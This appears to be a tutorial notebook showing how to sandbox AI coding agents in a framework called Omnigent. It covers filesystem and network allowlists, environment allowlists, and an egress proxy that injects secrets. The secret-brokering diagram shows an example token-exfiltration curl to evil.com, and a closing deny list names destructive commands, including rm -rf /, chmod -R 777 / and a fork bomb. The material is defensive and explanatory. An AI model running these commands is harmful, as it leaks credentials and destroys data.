# Example 05: Sandboxing & Security

**Goal:** Configure OS sandboxes to restrict filesystem and network access, and understand secret brokering.

**Key concept:** Omnigent's Omnibox isolates agents at the OS level — filesystem, network, and environment variables are controlled by the sandbox config, not by trusting the model.

## 1. Sandbox Modes

In [ ]:
sandbox_modes = {
    'none': {
        'isolation': 'None — agent runs as your user',
        'use_case': 'Personal dev, fully trusted',
        'risk': 'HIGH — can read SSH keys, delete files, push to prod'
    },
    'linux_bwrap': {
        'isolation': 'Linux namespaces via bubblewrap',
        'use_case': 'Team server, CI/CD, untrusted agents',
        'risk': 'LOW — only allowed paths visible'
    },
    'darwin_seatbelt': {
        'isolation': 'macOS Seatbelt sandbox',
        'use_case': 'macOS development',
        'risk': 'LOW — built-in macOS sandboxing'
    },
    'managed_host': {
        'isolation': 'Cloud sandbox (Modal, Daytona, Islo)',
        'use_case': 'No local compute, max isolation',
        'risk': 'MINIMAL — ephemeral cloud VM'
    }
}

for mode, info in sandbox_modes.items():
    print(f"{mode}:")
    for k, v in info.items():
        print(f"  {k}: {v}")
    print()

## 2. Sandbox Configuration Options

In [ ]:
sandbox_yaml_template = '''
os_env:
  type: caller_process
  cwd: .
  sandbox:
    type: linux_bwrap          # or: darwin_seatbelt, none

    # Filesystem access
    write_paths:               # paths agent may WRITE
      - ./output
      - /tmp/omnigent

    read_paths:                # paths agent may READ
      - ./src
      - ./tests
      - ./data
      - ./pyproject.toml

    # Everything NOT listed is INVISIBLE to the agent

    # Network access
    allow_network: true        # or false for air-gapped

  # Environment variables
  env:                         # explicit allowlist
    FOO: bar
    NODE_ENV: development
    # Variables NOT listed are NOT passed to agent
'''
print(sandbox_yaml_template)

## 3. Secret Brokering Explained

In [ ]:
secret_brokering_diagram = '''
WITHOUT BROKERING (typical agent CLI):
  Agent env: GITHUB_TOKEN=ghp_xxxx
  Agent can: echo $GITHUB_TOKEN → leak!
  Agent can: curl evil.com?token=$GITHUB_TOKEN → exfiltrate!

WITH BROKERING (Omnigent):
  Agent env: (no GITHUB_TOKEN visible)
  Agent runs: git push origin main
  Egress proxy detects: this needs GitHub auth
  Proxy checks: is git push to this repo allowed?
  Proxy injects: GITHUB_TOKEN at egress, forwards
  Agent NEVER sees: GITHUB_TOKEN value
'''
print(secret_brokering_diagram)

## 4. Agent: Sandboxed Coder (Max Lockdown)

In [ ]:
sandboxed_coder = '''
name: sandboxed_coder
description: A coding agent locked to ./src and ./tests only.

prompt: |
  You write code in ./src and tests in ./tests.
  You can read docs from ./docs but never modify them.
  You have NO access to ~/.ssh, .env, or system files.

executor:
  harness: claude-sdk
  model: claude-sonnet-4-6

os_env:
  type: caller_process
  cwd: .
  sandbox:
    type: linux_bwrap
    write_paths:
      - ./src
      - ./tests
    read_paths:
      - ./src
      - ./tests
      - ./docs
      - ./pyproject.toml
    allow_network: true

# No secrets in env
  env:
    PYTHONUNBUFFERED: "1"

policies:
  ask_shell:
    type: function
    handler: omnigent.policies.builtins.safety.ask_on_os_tools

guardrails:
  policies:
    blast_radius:
      type: function
      function:
        path: omnigent.inner.nessie.policies.blast_radius
        arguments:
          gate_pushes: true
'''

with open('agent_sandboxed.yaml', 'w') as f:
    f.write(sandboxed_coder)
print("Created agent_sandboxed.yaml")
print("This agent CAN: write to ./src and ./tests, read docs")
print("This agent CANNOT: read ~/.ssh, .env, ~/.aws, write anywhere else")

## 5. Security Decision Matrix

| Scenario | Sandbox | Network | Write Paths | Secrets |
|---|---|---|---|---|
| **Personal dev** | none | true | ./ | In env |
| **Team agent** | linux_bwrap | true | ./output only | Brokered |
| **CI/CD** | linux_bwrap | true | ./build only | Brokered |
| **Untrusted 3rd-party** | linux_bwrap | false | /tmp only | Brokered |
| **Read-only research** | linux_bwrap | false | none | None |

## 6. Blast Radius: Always-On Protections

These are ALWAYS denied, regardless of sandbox config:
- `rm -rf /` and variants
- `git push --force` to any remote
- `git reset --hard` to a remote ref
- `chmod -R 777 /`
- Fork bombs (`:(){ :|:& };:`)

**Back to theory:** [Chapter 06 — Sandbox & Security Model](../part1_theory/06_sandbox_and_security.md)
**Continue:** [Part 3 — Stanford Meta-Harness](../part3_meta_harness/09_harness_optimization_theory.md)